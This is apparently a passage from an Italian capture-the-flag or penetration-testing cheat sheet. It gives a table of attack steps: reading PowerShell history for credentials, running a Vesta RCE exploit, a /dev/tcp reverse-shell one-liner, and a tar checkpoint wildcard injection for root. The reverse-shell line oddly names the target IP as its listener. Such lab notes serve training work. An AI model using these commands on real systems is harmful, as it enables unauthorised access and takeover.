| **History Cmd File** | 1. ```type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\<br>PowerShell\PSReadLine\ConsoleHost_history.txt```        | Con la *1.* ispezioniamo lo storico dei comandi di powershell ed otteniamo delle credenziali                                                                                                                                                                                                                 |
| **Vesta RCE**        | 1. `snmpwalk -v2c -c public <IP_TARGET>`<br>2. `python3 vestaROOT.py https://<IP_TARGET>:8083 <USER> <PASS>`                    | Con la scansione UDP *1.* troviamo lo stream di dati e con esso le credenziali dell'utente `jack`. Inseriamo le credenziali della pagina di login del servizo *Vesta* e notiamo che √® vulnerabile a [RCE](https://github.com/CSpanias/vesta-rce-exploit). Utilizziamo la *2.* per sfruttare la vulnerabilit√† |
| **Usermin**          | 1. `ftp IP_TARGET`<br>2. `exiftool -a *.pdf`<br>3. `sh -i >& /dev/tcp/<IP_TARGET>/4444 0>&1`                                    | Entriamo nel servizio FTP con credenziali `anonymous` con la *1.*, con la *2.* analizziamo i file e troviamo alcuni utenti. Usiamo la `cassie:cassie` per entrare nel servizio *Usermin*. Andiamo nella command shell (in basso a tutto) ed avviamo una reverse shell con la *3.*                            |
| **Cronjobs**         | 1. `--checkpoint=1`<br>2. `--checkpoint-action=exec=sh test.sh`<br>3. `test.sh`<br>4. `/bin/bash -p`<br>                        | Troviamo il file `/etc/cron.d/2minutes` che ogni 2 minuti esegue il comando `cd /opt/admin && tar -zxf /tmp/backup.tar.gz *` su un file.<br>Utilizziamo la *1.-3.* per creare un payload che quando verr√† caricato dal cronjob ci fornir√† i permessi per eseguire la *4.* e diventare root del sistema       |
